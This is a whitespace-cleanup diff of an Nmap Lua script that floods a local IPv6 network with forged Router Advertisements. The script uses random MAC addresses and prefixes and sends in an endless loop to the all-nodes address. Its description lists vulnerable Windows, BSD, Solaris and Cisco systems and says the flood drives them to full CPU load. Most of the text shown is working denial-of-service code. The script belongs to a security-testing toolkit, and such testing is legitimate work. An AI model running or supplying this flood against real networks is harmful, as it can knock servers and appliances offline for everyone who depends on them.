@@ -5,22 +5,22 @@ local math = require "math"
 local string = require "string"
 local os = require "os"
 
-description = [[ Generates a flood of Router Advertisements (RA) with random source MAC addresses and IPv6 prefixes. Computers, which have stateless autoconfiguration enabled by default (every major OS), 
+description = [[ Generates a flood of Router Advertisements (RA) with random source MAC addresses and IPv6 prefixes. Computers, which have stateless autoconfiguration enabled by default (every major OS),
 will start to compute IPv6 suffix and update their routing table to reflect the accepted announcement. This will cause 100% CPU usage on Windows and platforms, preventing to process other application requests.
 
 Vulnerable platforms:
 * All Cisco IOS ASA with firmware < November 2010
 * All Netscreen versions supporting IPv6
-* Windows 2000/XP/2003/Vista/7/2008/8/2012 
+* Windows 2000/XP/2003/Vista/7/2008/8/2012
 * All FreeBSD versions
 * All NetBSD versions
-* All Solaris/Illumos versions 
+* All Solaris/Illumos versions
 
 Security advisory: http://www.mh-sec.de/downloads/mh-RA_flooding_CVE-2010-multiple.txt
 
-WARNING: This script is dangerous and is very likely to bring down a server or network appliance. 
+WARNING: This script is dangerous and is very likely to bring down a server or network appliance.
 It should not be run in a production environment unless you (and, more importantly,
-the business) understand the risks! 
+the business) understand the risks!
 
 Additional documents: https://tools.ietf.org/rfc/rfc6104.txt
 ]]
@@ -45,17 +45,17 @@ math.randomseed(os.time())
 prerule = function()
 	if nmap.address_family() ~= "inet6" then
 	 	stdnse.print_debug("%s is IPv6 compatible only.", SCRIPT_NAME)
-		return false 
+		return false
 	end
-	
+
 	if not nmap.is_privileged() then
-		stdnse.print_debug("Running %s needs root privileges.", SCRIPT_NAME)	
-		return false 
+		stdnse.print_debug("Running %s needs root privileges.", SCRIPT_NAME)
+		return false
 	end
 
 	if not stdnse.get_script_args(SCRIPT_NAME .. ".interface") and not nmap.get_interface() then
-		stdnse.print_debug("No interface was selected, aborting...", SCRIPT_NAME)	
-		return false 
+		stdnse.print_debug("No interface was selected, aborting...", SCRIPT_NAME)
+		return false
 	end
 
 	return true
@@ -65,16 +65,16 @@ local function get_interface()
 	local arg_interface = stdnse.get_script_args(SCRIPT_NAME .. ".interface") or nmap.get_interface()
 
 	local if_table = nmap.get_interface_info(arg_interface)
-	
+
 	if if_table and packet.ip6tobin(if_table.address) and if_table.link == "ethernet" then
 			return if_table.device
 		else
 			stdnse.print_debug("Interface %s not supported or not properly configured, exiting...", arg_interface)
-	end			
+	end
 end
 
 --- Generates random MAC address
--- @return mac string containing random MAC address 
+-- @return mac string containing random MAC address
 local function random_mac()
 
 	local mac = string.format("%02x:%02x:%02x:%02x:%02x:%02x", 00, 180, math.random(256)-1, math.random(256)-1, math.random(256)-1, math.random(256)-1)
@@ -105,7 +105,7 @@ local function build_router_advert(mac_src,prefix,prefix_len,valid_time,preferre
 		0x00,0x00,0x00,0x00, --reachable time
 		0x00,0x00,0x00,0x00) --retrans timer
 
-	local mtu_option_msg = string.char(0x00, 0x00) .. -- reserved 
+	local mtu_option_msg = string.char(0x00, 0x00) .. -- reserved
 		packet.numtostr32(mtu) -- MTU
 
 	local prefix_option_msg = string.char(prefix_len, 0xc0) .. --flags: Onlink, Auto
@@ -117,14 +117,14 @@ local function build_router_advert(mac_src,prefix,prefix_len,valid_time,preferre
 	local icmpv6_mtu_option = packet.Packet:set_icmpv6_option(packet.ND_OPT_MTU, mtu_option_msg)
 	local icmpv6_prefix_option = packet.Packet:set_icmpv6_option(packet.ND_OPT_PREFIX_INFORMATION, prefix_option_msg)
 	local icmpv6_src_link_option = packet.Packet:set_icmpv6_option(packet.ND_OPT_SOURCE_LINKADDR, mac_src)
-	
+
 	local icmpv6_payload = ra_msg .. icmpv6_mtu_option .. icmpv6_prefix_option .. icmpv6_src_link_option
 
 	return icmpv6_payload
 end
 
 --- Broadcasting on the selected interface
--- @param iface table containing interface information 
+-- @param iface table containing interface information
 local function broadcast_on_interface(iface)
 	stdnse.print_verbose("Starting " .. SCRIPT_NAME .. " on interface " .. iface)
 
@@ -137,34 +137,34 @@ local function broadcast_on_interface(iface)
 	local dnet = nmap.new_dnet()
 
 	try(dnet:ethernet_open(iface))
-	
+
 	local dst_mac = packet.mactobin("33:33:00:00:00:01")
 	local dst_ip6_addr = packet.ip6tobin("ff02::1")
-	
+
 	local prefix_len = 64
-	
+
 	--- maximum possible value of 4-byte integer
 	local valid_time = tonumber(0xffffffff)
-	local preffered_time = tonumber(0xffffffff) 
-	
+	local preffered_time = tonumber(0xffffffff)
+
 	local mtu = 1500
 
 	local start, stop = os.time()
 
 	while true do
 
-		local src_mac = packet.mactobin(random_mac()) 
+		local src_mac = packet.mactobin(random_mac())
 		local src_ip6_addr = packet.mac_to_lladdr(src_mac)
-		
+
 		local prefix = packet.ip6tobin(get_random_prefix())
-		
+
 		local packet = packet.Frame:new()
 
 		packet.mac_src = src_mac
 		packet.mac_dst = dst_mac
 		packet.ip_bin_src = src_ip6_addr
 		packet.ip_bin_dst = dst_ip6_addr
-		
+
 		local icmpv6_payload = build_router_advert(src_mac, prefix, prefix_len, valid_time, preffered_time, mtu)
 		packet:build_icmpv6_header(134, 0, icmpv6_payload)
 		packet:build_ipv6_packet()
@@ -187,6 +187,6 @@ end
 
 function action()
 	local interface = get_interface()
-	
+
 	broadcast_on_interface(interface)
 end
